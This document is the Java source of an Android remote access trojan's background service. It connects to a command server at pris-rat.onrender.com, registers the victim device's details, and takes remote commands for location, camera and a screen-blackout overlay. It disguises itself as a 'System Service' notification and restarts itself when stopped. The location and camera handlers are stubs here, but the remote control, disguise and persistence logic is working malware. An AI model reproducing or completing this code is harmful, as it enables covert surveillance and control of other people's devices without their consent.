package com.pris.rat.tool;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import io.socket.client.IO;
import io.socket.client.Socket;

import org.json.JSONObject;

import java.net.URISyntaxException;
import java.util.UUID;

public class RatService extends Service {
    private static final String TAG = "PrisRAT";
    private static final String SERVER_URL = "https://pris-rat.onrender.com";
    private Socket socket;
    private String deviceId;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");

        deviceId = getDeviceId();
        startForeground(1, buildNotification());
        connectSocket();
    }

    private String getDeviceId() {
        String id = getSharedPreferences("pris", MODE_PRIVATE).getString("did", null);
        if (id == null) {
            id = UUID.randomUUID().toString().substring(0, 8);
            getSharedPreferences("pris", MODE_PRIVATE).edit().putString("did", id).apply();
        }
        return id;
    }

    private Notification buildNotification() {
        String CH = "pris_svc";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CH, "System Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null) nm.createNotificationChannel(ch);
        }
        return new NotificationCompat.Builder(this, CH)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    private void connectSocket() {
        try {
            socket = IO.socket(SERVER_URL);
            
            socket.on(Socket.EVENT_CONNECT, args -> {
                Log.d(TAG, "Socket connected!");
                try {
                    JSONObject reg = new JSONObject();
                    reg.put("id", deviceId);
                    reg.put("model", Build.MANUFACTURER + " " + Build.MODEL);
                    reg.put("android", Build.VERSION.RELEASE);
                    reg.put("battery", 100);
                    socket.emit("register", reg);
                    Log.d(TAG, "Registered: " + deviceId);
                } catch (Exception e) {
                    Log.e(TAG, "Reg error", e);
                }
            });

            socket.on(Socket.EVENT_CONNECT_ERROR, args -> {
                Log.e(TAG, "Socket connect error: " + (args.length > 0 ? args[0].toString() : "unknown"));
            });

            socket.on(Socket.EVENT_DISCONNECT, args -> {
                Log.d(TAG, "Socket disconnected");
            });

            socket.on("execute", args -> {
                try {
                    JSONObject cmd = (JSONObject) args[0];
                    String action = cmd.getString("action");
                    Log.d(TAG, "Command: " + action);
                    handleCommand(action, cmd);
                } catch (Exception e) {
                    Log.e(TAG, "Cmd error", e);
                }
            });

            socket.connect();
            Log.d(TAG, "Socket connecting to " + SERVER_URL);
        } catch (URISyntaxException e) {
            Log.e(TAG, "URI error", e);
        }
    }

    private void handleCommand(String action, JSONObject cmd) {
        switch (action) {
            case "location":
                sendLocation();
                break;
            case "camera":
                sendCamera();
                break;
            case "blackout":
                startService(new Intent(this, OverlayService.class));
                break;
            case "unblackout":
                stopService(new Intent(this, OverlayService.class));
                break;
        }
    }

    private void sendLocation() {
        try {
            JSONObject resp = new JSONObject();
            resp.put("id", deviceId);
            resp.put("type", "location");
            resp.put("lat", 0.0);
            resp.put("lon", 0.0);
            if (socket != null && socket.connected()) socket.emit("response", resp);
        } catch (Exception ignored) {}
    }

    private void sendCamera() {
        try {
            JSONObject resp = new JSONObject();
            resp.put("id", deviceId);
            resp.put("type", "camera");
            resp.put("image", "");
            if (socket != null && socket.connected()) socket.emit("response", resp);
        } catch (Exception ignored) {}
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "onStartCommand");
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed");
        if (socket != null) socket.disconnect();
        Intent restart = new Intent(this, RatService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restart);
        } else {
            startService(restart);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}